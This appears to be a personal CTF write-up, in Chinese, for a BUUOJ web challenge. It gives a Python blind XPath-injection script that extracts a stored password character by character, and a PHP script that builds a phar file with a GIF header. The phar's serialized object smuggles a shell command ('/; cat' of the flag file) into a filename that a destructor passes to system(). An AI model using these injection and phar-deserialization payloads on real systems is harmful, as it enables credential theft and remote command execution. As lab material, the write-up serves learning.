tags:: CTF/Xpath, CTF/PHP/Phar

- > 复现
- # 思路
	- 使用[xpath注入]([[CTF/XPATH]])得到账号密码，登陆
	- F12看到源代码泄漏
	- 使用[phar POP]([[CTF/PHP/Phar]])实现RCE
- # Xpath注入
	- 脚本
		- ```python
		  url = "http://f3b9594d-6bf5-47bb-a0e4-e62c761263ac.node4.buuoj.cn:81/index.php"
		  
		  # payload = "114514' or substring(name(/*),{},1)='{}' or '" # account
		  # payload = "114514' or substring(name(/accounts/*),{},1)='{}' or '" # user
		  # payload = "114514' or substring(name(/accounts/user/*[position()=1]),{},1)='{}' or '" # username
		  # payload = "114514' or substring(name(/accounts/user/*[position()=2]),{},1)='{}' or '" # password
		  payload = "114514' or substring(/accounts/user/password,{},1)='{}' or '" # 
		  
		  def submit(payload):
		      r = base_post(url, data = {
		          "username": payload,
		          "password": "123",
		          "submit": "114514"
		      })
		  
		      _ = base_get(url)
		      return r
		  
		  def get_by_payload(payload):
		  
		      known = ""
		      while True:
		          visited = set()
		          for c in itertools.chain(string.digits, string.ascii_lowercase, string.printable):
		              if c == "'" or c in visited:
		                  continue
		              visited.add(c)
		              r = submit(payload.format(str(len(known) + 1), c))
		              if "登录成功" in r.text:
		                  known += c
		                  print(known)
		                  break
		          else:
		              print("> break")
		              break
		      return known
		  
		  # first_node = get_by_payload(payload)
		  # submit("114514' or count(/accounts/user/*)=2 or '").text
		  get_by_payload(payload)
		  # 密码：15035371139
		  ```
	- 拿到[somd5](https://www.somd5.com/)破解密码md5即可
- # Phar POP
	- ```php
	  <?php
	  class FILE{
	      public $filename;
	      public $lasttime;
	      public $size;
	      public function __construct($filename){
	          if (preg_match("/\//i", $filename)){
	              // throw new Error("hacker!");
	          }
	          $num = substr_count($filename, ".");
	          if ($num != 1){
	              // throw new Error("hacker!");
	          }
	          if (!is_file($filename)){
	              // throw new Error("???");
	          }
	          $this->filename = $filename;
	          $this->size = filesize($filename);
	          $this->lasttime = filemtime($filename);
	      }
	      public function remove(){
	          unlink($this->filename);
	      }
	      public function show()
	      {
	          echo "Filename: ". $this->filename. "  Last Modified Time: ".$this->lasttime. "  Filesize: ".$this->size."<br>";
	      }
	      public function __destruct(){
	          system("ls -all ".$this->filename);
	      }
	  }
	  $o = new FILE("/; cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd");
	  //打开phar文件
	  @unlink("phar.phar");
	  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
	  $phar->startBuffering();
	  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
	  
	  //放入对象
	  $phar->setMetadata($o);
	  
	  //添加压缩的文件（test为其中的内容）
	  $phar->addFromString("test.txt", "test");
	  $phar->stopBuffering();
	  ?>
	  ```
-